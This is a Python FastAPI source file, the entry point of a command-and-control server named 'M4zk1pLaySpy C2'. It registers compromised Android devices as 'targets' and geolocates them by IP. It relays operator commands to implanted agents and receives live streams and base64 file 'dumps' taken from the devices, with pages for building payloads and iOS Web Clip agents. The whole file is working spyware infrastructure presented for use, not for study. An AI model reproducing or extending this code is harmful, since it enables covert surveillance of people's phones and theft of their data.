"""Entry point M4zk1pLaySpy C2."""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import time
import uuid
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Form, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

from . import (api_admin, api_build, api_control, api_dump, api_ios,
               api_targets, config, db, ipgeo, security)
from .ws import hub

VERSION = "1.4.1"

app = FastAPI(title="M4zk1pLaySpy C2", version=VERSION, docs_url="/api/docs")

config.ensure_dirs()
db.init()

app.mount("/static", StaticFiles(directory=str(config.STATIC_DIR)), name="static")
app.include_router(api_targets.router)
app.include_router(api_control.router)
app.include_router(api_dump.router)
app.include_router(api_build.router)
app.include_router(api_admin.router)
app.include_router(api_ios.router)


# ---------------------------------------------------------------- halaman
def page(name: str) -> HTMLResponse:
    f = config.WEB_DIR / name
    if not f.exists():
        return HTMLResponse(f"<h1>{name} belum ada</h1>", status_code=500)
    return HTMLResponse(f.read_text(encoding="utf-8"))


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    if security.valid_session(request.cookies.get(security.COOKIE)):
        return RedirectResponse("/dashboard")
    return page("login.html")


@app.get("/403", response_class=HTMLResponse)
async def forbidden():
    return page("403.html")


@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    return page("dashboard.html")


@app.get("/targets", response_class=HTMLResponse)
async def targets_page():
    return page("targets.html")


@app.get("/build", response_class=HTMLResponse)
async def build_page():
    return page("build.html")


@app.get("/dumps", response_class=HTMLResponse)
async def dumps_page():
    return page("dumps.html")


@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return page("admin.html")


@app.get("/agent", response_class=HTMLResponse)
async def agent_page():
    """Halaman ringan untuk Web Clip iOS."""
    return page("agent.html")


@app.get("/favicon.ico")
async def favicon():
    return FileResponse(config.STATIC_DIR / "img" / "garuda.svg", media_type="image/svg+xml")


# ---------------------------------------------------------------- auth
@app.post("/api/login")
async def login(request: Request, license: str = Form(...)):
    if not security.check_license(license):
        db.audit("login_gagal", security.client_ip(request))
        return JSONResponse({"ok": False, "message": "License ditolak"}, status_code=403)
    token = security.create_session(
        security.client_ip(request), request.headers.get("user-agent", ""))
    resp = JSONResponse({"ok": True, "redirect": "/dashboard"})
    resp.set_cookie(
        security.COOKIE, token, httponly=True, samesite="lax",
        max_age=int(config.get("session_hours", 24)) * 3600,
    )
    return resp


@app.post("/api/logout")
async def logout(request: Request):
    security.kill_session(request.cookies.get(security.COOKIE))
    resp = JSONResponse({"ok": True})
    resp.delete_cookie(security.COOKIE)
    return resp


@app.get("/api/session")
async def session(request: Request):
    ok = security.valid_session(request.cookies.get(security.COOKIE))
    return {"ok": ok, "license": bool(config.get("require_license", True))}


# ---------------------------------------------------------------- ws operator
@app.websocket("/ws/operator")
async def ws_operator(ws: WebSocket):
    token = ws.cookies.get(security.COOKIE)
    if not security.valid_session(token):
        await ws.close(code=4401)
        return
    await ws.accept()
    await hub.add_operator(ws)
    try:
        while True:
            raw = await ws.receive_text()
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if msg.get("t") == "ping":
                await ws.send_text(json.dumps({"t": "pong", "ts": time.time()}))
            elif msg.get("t") == "cmd":
                await hub.command(msg.get("target", ""), msg.get("type", ""), msg.get("args") or {})
    except WebSocketDisconnect:
        pass
    finally:
        await hub.drop_operator(ws)


# ---------------------------------------------------------------- ws agent
@app.websocket("/ws/agent")
async def ws_agent(ws: WebSocket):
    await ws.accept()
    target_id = ""
    try:
        hello_raw = await asyncio.wait_for(ws.receive_text(), timeout=20)
        try:
            hello = json.loads(hello_raw)
        except json.JSONDecodeError:
            await ws.close(code=4400)
            return
        if hello.get("t") != "hello":
            await ws.close(code=4400)
            return

        token = str(hello.get("token") or "").strip()
        if not token:
            token = uuid.uuid4().hex
        info: dict[str, Any] = hello.get("info") or {}
        ip = security.client_ip_from_ws(ws)
        existing = db.one("SELECT * FROM targets WHERE token=?", (token,))

        if existing is None:
            target_id = uuid.uuid4().hex[:10]
            geo = await ipgeo.lookup(ip)
            now = time.time()
            db.x(
                "INSERT INTO targets(id,token,label,brand,model,android,sdk,ip,isp,country,city,"
                "lat,lon,battery,charging,storage_free,first_seen,last_seen)"
                " VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (target_id, token, info.get("label") or info.get("model") or "Target",
                 info.get("brand", ""), info.get("model", ""), info.get("android", ""),
                 int(info.get("sdk") or 0), ip, geo["isp"], geo["country"], geo["city"],
                 geo["lat"], geo["lon"], int(info.get("battery") or 0),
                 1 if info.get("charging") else 0, int(info.get("storage_free") or 0),
                 now, now),
            )
            db.audit("target_baru", f"{target_id} :: {info.get('model','?')} :: {ip}")
        else:
            target_id = existing["id"]
            db.x(
                "UPDATE targets SET ip=?,brand=?,model=?,android=?,sdk=?,battery=?,"
                "charging=?,storage_free=?,last_seen=? WHERE id=?",
                (ip, info.get("brand", existing["brand"]), info.get("model", existing["model"]),
                 info.get("android", existing["android"]), int(info.get("sdk") or 0),
                 int(info.get("battery") or 0), 1 if info.get("charging") else 0,
                 int(info.get("storage_free") or 0), time.time(), target_id),
            )

        await ws.send_text(json.dumps({"t": "hello_ok", "id": target_id}))
        await hub.add_agent(target_id, ws)
        await hub.flush_queue(target_id)
        await hub.to_operators({"t": "targets_dirty"})

        while True:
            raw = await ws.receive_text()
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue
            kind = msg.get("t")
            if kind == "ping":
                await ws.send_text(json.dumps({"t": "pong"}))
            elif kind == "result":
                db.x(
                    "UPDATE commands SET status=?,result=?,updated=? WHERE id=?",
                    ("done" if msg.get("ok") else "error",
                     json.dumps(msg.get("data"))[:60000], time.time(), msg.get("id")),
                )
                await hub.to_operators({
                    "t": "result", "id": msg.get("id"), "target": target_id,
                    "ok": bool(msg.get("ok")), "data": msg.get("data"),
                })
            elif kind == "stream":
                await hub.to_operators({
                    "t": "stream", "target": target_id,
                    "kind": msg.get("kind"), "b64": msg.get("b64"),
                    "meta": msg.get("meta"),
                })
            elif kind == "info":
                data = msg.get("data") or {}
                db.x("UPDATE targets SET battery=?,last_seen=? WHERE id=?",
                     (int(data.get("battery") or 0), time.time(), target_id))
                await hub.to_operators({"t": "info", "target": target_id, "data": data})
            elif kind == "dump":
                await _handle_dump(target_id, msg)
    except (WebSocketDisconnect, asyncio.TimeoutError):
        pass
    finally:
        if target_id:
            await hub.drop_agent(target_id, ws)
            await hub.to_operators({"t": "targets_dirty"})


async def _handle_dump(target_id: str, msg: dict[str, Any]) -> None:
    kind = str(msg.get("kind") or "lain")
    raw_name = Path(str(msg.get("name") or f"{kind}_{int(time.time())}.bin")).name
    name = raw_name.replace("/", "_").replace("\\", "_") or f"{kind}_{int(time.time())}.bin"
    raw = msg.get("b64") or ""
    try:
        blob = base64.b64decode(raw)
    except (ValueError, TypeError):
        return
    if not blob:
        return
    folder = config.DUMP_DIR / target_id
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / name
    path.write_bytes(blob)
    dump_id = uuid.uuid4().hex[:12]
    db.x(
        "INSERT INTO dumps(id,target_id,kind,filename,size,sha256,created) VALUES(?,?,?,?,?,?,?)",
        (dump_id, target_id, kind, name, len(blob),
         hashlib.sha256(blob).hexdigest(), time.time()),
    )
    await hub.to_operators({
        "t": "dump", "target": target_id, "id": dump_id,
        "kind": kind, "name": name, "size": len(blob),
    })
    db.audit("dump", f"{target_id} :: {kind} :: {name}")


@app.get("/health")
async def health():
    return {"ok": True, "version": VERSION, "ts": time.time()}
